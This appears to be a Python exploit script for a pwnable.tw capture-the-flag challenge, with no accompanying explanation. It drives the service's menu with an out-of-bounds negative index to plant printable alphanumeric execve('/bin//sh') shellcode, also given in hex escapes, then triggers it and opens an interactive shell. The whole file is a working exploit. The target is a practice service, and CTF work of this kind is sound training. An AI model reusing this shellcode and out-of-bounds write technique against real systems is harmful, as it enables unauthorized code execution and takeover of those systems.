import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

def main():
    #sc = "\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x4a\x4a\x30\x50\x20\x30\x50\x21\x42\x42\x52\x59\x6a\x40\x58\x34\x4b\x52\x52" + "\x33\x7e"
    sc = "Rh//shh/binT[JJ0P 0P!BBRYj@X4KRR3~"

    read_until(f, "Your choice :")
    f.write("1\n")
    read_until(f, "Index :")
    f.write("-19\n")
    read_until(f, "Name :")
    f.write(sc + "\n")

    read_until(f, "Your choice :")
    f.write("3\n")
    read_until(f, "Index :")
    f.write("-19\n")

    shell(s)          

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("chall.pwnable.tw", 10201)
        main()
    else:
        s, f = sock("localhost", 10201)
        main()
